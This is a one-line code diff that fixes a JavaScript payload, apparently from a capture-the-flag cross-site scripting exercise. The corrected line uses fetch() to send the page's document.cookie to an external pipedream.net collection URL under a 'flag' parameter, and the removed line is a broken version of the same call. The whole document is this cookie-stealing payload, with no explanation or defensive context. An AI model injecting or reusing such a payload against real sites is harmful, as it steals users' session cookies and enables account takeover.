@@ -1,1 +1,1 @@
-fetch('https://eozgj45auipfhih.m.pipedream.net' + ?k=document.cookie)  
+fetch('https://eozgj45auipfhih.m.pipedream.net?flag=' + document.cookie)
